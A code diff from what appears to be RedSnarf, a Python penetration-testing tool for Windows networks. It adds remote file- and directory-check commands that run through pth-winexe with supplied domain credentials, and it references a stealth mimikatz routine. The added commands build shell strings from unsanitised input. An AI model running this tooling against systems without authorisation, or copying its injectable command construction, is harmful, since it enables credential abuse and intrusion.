@@ -1122,6 +1122,8 @@ def datadump(user, passw, host, path, os_version):
 					#[upload]destdir=,localpath=,localfile=
 					#[download]remotedir=,remfile=
 					#[execute]command=
+					#[chkfile]file=
+					#[chkdir]dir=
 
 					fo=open(xscript,"r").read()
 					for line in fo.splitlines():
@@ -1194,10 +1196,34 @@ def datadump(user, passw, host, path, os_version):
 							if os.path.isfile(outputpath+host+"/"+remfile):
 								print colored("[+]File Downloaded to ",'yellow')+outputpath+host+"/"+remfile
 
+						elif line[0:9]=="[chkfile]":
+							chkfile=line[9:len(line)]
+							
+							if chkfile[0:5]=="file=":
+								chkfile=chkfile[5:len(chkfile)]
+								
+								proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+host+" \"cmd /c dir "+chkfile+"\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+								stdout_value = proc.communicate()[0]
+																
+								if not "bytes free" in stdout_value:
+									raise Exception('[!]File not found '+chkfile)
+
+						elif line[0:8]=="[chkdir]":
+							chkdir=line[8:len(line)]
+							
+							if chkdir[0:4]=="dir=":
+								chkdir=chkdir[4:len(chkdir)]
+								
+								proc = subprocess.Popen("/usr/bin/pth-winexe -U \""+domain_name+"\\"+user+"%"+passw+"\" --uninstall \/\/"+host+" \"cmd /c dir "+chkdir+"\" 2>/dev/null", stdout=subprocess.PIPE,shell=True)
+								stdout_value = proc.communicate()[0]
+																
+								if not "bytes free" in stdout_value:
+									raise Exception('[!]Directory Not Found '+chkdir)
+
 				except Exception as e:
-					print e
-					print colored("[-]Something went wrong ...",'red')
-					logging.error("[-]Something went wrong running custom command")
+					
+					print colored(str(e),'red')
+					logging.error("[-]Something went wrong running custom command "+str(e))
 
 			#Routine runs a stealth mimikatz
 			if stealth_mimi in yesanswers or stealth_mimi=="AV":
@@ -2090,7 +2116,7 @@ def main():
 
 #Display the user menu.
 banner()
-p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="RedSnarf Version 0.5a", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150),description = "Offers a rich set of features to help Pentest Servers and Workstations")
+p = argparse.ArgumentParser("./redsnarf -H ip=192.168.0.1 -u administrator -p Password1", version="RedSnarf Version 0.5b", formatter_class=lambda prog: argparse.HelpFormatter(prog,max_help_position=20,width=150),description = "Offers a rich set of features to help Pentest Servers and Workstations")
 
 # Creds
 p.add_argument("-H", "--host", dest="host", help="Specify a hostname -H ip= / range -H range= / targets file -H file= to grab hashes from")
